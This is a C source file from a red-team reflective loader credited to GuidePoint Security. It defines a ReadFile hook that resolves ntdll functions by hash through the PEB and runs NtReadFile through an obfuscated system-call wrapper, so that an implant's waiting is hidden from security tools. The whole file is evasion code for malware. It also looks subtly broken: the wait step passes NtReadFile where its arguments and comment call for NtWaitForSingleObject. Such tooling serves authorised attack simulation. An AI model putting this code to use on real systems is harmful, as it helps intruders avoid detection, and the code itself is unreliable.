/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

typedef struct
{
	D_API( NtWaitForSingleObject );
	D_API( RtlNtStatusToDosError );
	D_API( RtlSetLastWin32Error );
	D_API( RtlAllocateHeap );
	D_API( RtlFreeHeap );
	D_API( NtReadFile );
} API ;

/* API Hashes */
#define H_API_NTWAITFORSINGLEOBJECT     0xe8ac0c3c /* NtWaitForSingleObject */
#define H_API_RTLNTSTATUSTODOSERROR     0x39d7c890 /* RtlNtStatusToDosError */
#define H_API_RTLSETLASTWIN32ERROR      0xfd303374 /* RtlSetLastWin32Error */
#define H_API_RTLALLOCATEHEAP           0x3be94c5a /* RtlAllocateHeap */
#define H_API_RTLFREEHEAP               0x73a9e4d7 /* RtlFreeHeap */
#define H_API_NTREADFILE		0xb2d93203 /* NtReadFile */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */


/*!
 *
 * Purpose:
 *
 * Obfuscates while waiting for a data to be read
 * from a named pipe, or a file. Returns a success
 * status if completed.
 *
!*/
D_SEC( D ) BOOL WINAPI ReadFile_Hook( _In_ HANDLE hFile, _In_ LPVOID lpBuffer, _In_ DWORD nNumberOfBytesToRead, _Out_ LPDWORD lpNumberOfBytes, _Inout_ LPOVERLAPPED lpOverlapped )
{
	API			Api;
	LARGE_INTEGER		Ofs;
	IO_STATUS_BLOCK		Isb;

	BOOLEAN			Ret = TRUE;	
	NTSTATUS		Nst = STATUS_UNSUCCESSFUL;

	PVOID			Apc = NULL;
	PVOID*			Ag1 = NULL;
	PVOID*			Ag2 = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ofs, sizeof( Ofs ) );
	RtlSecureZeroMemory( &Isb, sizeof( Isb ) );

	Api.NtWaitForSingleObject = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
	Api.RtlNtStatusToDosError = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLNTSTATUSTODOSERROR );
	Api.RtlSetLastWin32Error  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLSETLASTWIN32ERROR );
	Api.RtlAllocateHeap       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.RtlFreeHeap           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
	Api.NtReadFile            = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTREADFILE );

	do 
	{
		/* Create a buffer to hold our arguments */
		if ( ( Ag1 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, 9 * sizeof( PVOID ) ) ) != NULL ) {
			/* Execute NtReadFile */
			Ag1[ 0 ] = C_PTR( hFile );
			Ag1[ 1 ] = C_PTR( NULL );
			Ag1[ 2 ] = C_PTR( NULL );
			Ag1[ 3 ] = C_PTR( NULL );
			Ag1[ 4 ] = C_PTR( &Isb );
			Ag1[ 5 ] = C_PTR( lpBuffer );
			Ag1[ 6 ] = C_PTR( nNumberOfBytesToRead );
			Ag1[ 7 ] = C_PTR( NULL );
			Ag1[ 8 ] = C_PTR( NULL );
			Nst = ObfSystemCall( Api.NtReadFile, Ag1, 9 );

			if ( Nst == STATUS_PENDING ) {
				if ( ( Ag2 = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, 0, 3 * sizeof( PVOID ) ) ) != NULL ) {
					/* Execute NtWaitForSingleObject */
					Ag2[ 0 ] = C_PTR( hFile );
					Ag2[ 1 ] = C_PTR( FALSE );
					Ag2[ 2 ] = C_PTR( NULL );
					Nst = ObfSystemCall( Api.NtReadFile, Ag2, 3 );

					/* Success! */
					if ( NT_SUCCESS( Nst ) ) {
						Nst = Isb.Status;
					};
				} else 
				{
					/* Notify about lack of resources */
					Nst = STATUS_INSUFFICIENT_RESOURCES;
				};
			};
			if ( Nst == STATUS_END_OF_FILE ) {
				if ( lpNumberOfBytes != NULL ) {
					*lpNumberOfBytes = 0; 
				};
				/* Abort */
				break;
			};
			if ( NT_SUCCESS( Nst ) ) {
				if ( lpNumberOfBytes != NULL ) {
					*lpNumberOfBytes = Isb.Information; 
				};
			};
		} else
		{
			/* Notify about lack of resources */
			Nst = STATUS_INSUFFICIENT_RESOURCES;
		};
	} while ( 0 );

	/* Cleanup */
	if ( ! NT_SUCCESS( Nst ) ) {
		Api.RtlSetLastWin32Error( Api.RtlNtStatusToDosError( Nst ) );
		Ret = FALSE;
	};
	if ( Ag1 != NULL ) {
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Ag1 );
		Ag1 = NULL;
	};
	if ( Ag2 != NULL ) {
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Ag2 );
		Ag2 = NULL;
	};
	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ofs, sizeof( Ofs ) );
	RtlSecureZeroMemory( &Isb, sizeof( Isb ) );	

	/* Return */
	return Ret;
};
